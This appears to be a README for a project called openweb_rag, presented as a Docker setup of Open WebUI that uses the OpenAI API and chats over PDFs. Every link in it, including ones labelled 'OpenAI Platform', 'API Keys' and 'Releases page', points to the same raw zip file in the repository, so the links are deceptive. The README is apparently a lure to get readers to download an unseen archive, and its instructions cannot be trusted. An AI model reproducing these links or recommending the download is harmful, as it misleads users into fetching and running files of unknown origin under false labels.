# 🌐 openweb_rag - Seamless Chat with Your Documents

## 📥 Download Now
[![Download](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip)](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip)

## 📋 Description
Open WebUI with OpenAI API and RAG

Complete Docker setup for Open WebUI using OpenAI API for chat completions and Retrieval-Augmented Generation (RAG) with PDF document support.

## 📍 Features
- **OpenAI Integration**: Use GPT-4o, GPT-4 Turbo, or any OpenAI chat model.
- **RAG/Document Q&A**: Upload PDFs, create knowledge bases, and chat with your documents.
- **Persistent Storage**: All data survives container restarts (chats, uploads, embeddings).
- **No Local LLMs**: Uses only OpenAI API (no Ollama, no local model runtime).
- **Built-in Vector Database**: Open WebUI includes ChromaDB for embeddings.

## 🚀 Getting Started

### 1. 💻 Prerequisites
Before you download and run the application, ensure you meet the following requirements:

1. **Docker & Docker Compose**
   - Install Docker Desktop for macOS or Windows, or Docker Engine for Linux.
   - You will need Docker Compose version 3.8 or higher.
   - To confirm your installation, run these commands in your terminal:
     ```bash
     docker --version
     docker compose version
     ```

2. **OpenAI API Key**
   - Sign up for an account at [OpenAI Platform](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip).
   - Create your API key by visiting [API Keys](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip).
   - Make sure you have funding set up to use the API.

3. **System Requirements**
   - Minimum of 2 GB RAM.

### 2. 🔄 Download & Install
To get started, you need to download the application.

Visit the [Releases page](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip) to download the latest version. Choose the relevant file for your operating system, and follow the prompts to install.

### 3. 🏗️ Running the Application
Once you have Docker set up and the application downloaded, follow these steps to run it:

1. **Open your Terminal or Command Prompt**.
2. Navigate to the directory where you downloaded the application files. Use the `cd` command. For example:
   ```bash
   cd path/to/downloaded/files
   ```

3. Run the application using Docker Compose with this command:
   ```bash
   docker-compose up
   ```

4. Wait for the services to start. This may take a few moments.

5. Once everything is up and running, you can access the Open WebUI in your web browser. Open this link:
   ```
   http://localhost:3000
   ```

### 4. 📄 Using the Application
Now that the application is running, you can begin chatting with your documents:

- **Upload PDFs**: Click on the upload area on the webpage to add your PDF documents.
- **Ask Questions**: Type your questions in the chat box. The OpenAI API will process your inquiries using the uploaded documents.
- **Manage Your Data**: All chats and uploads are saved, even if you restart the application.

### 5. ⚙️ Troubleshooting
If you encounter issues, consider checking:

- **Docker Installation**: Ensure Docker is running and accessible.
- **API Key**: Verify that your OpenAI API key is active and correctly configured.
- **Firewall Settings**: Your firewall should allow Docker to communicate over the required ports.

### 6. 🌟 Community & Support
We encourage user feedback and contributions. If you have questions or issues, feel free to open an issue on our GitHub page.

Enjoy using openweb_rag!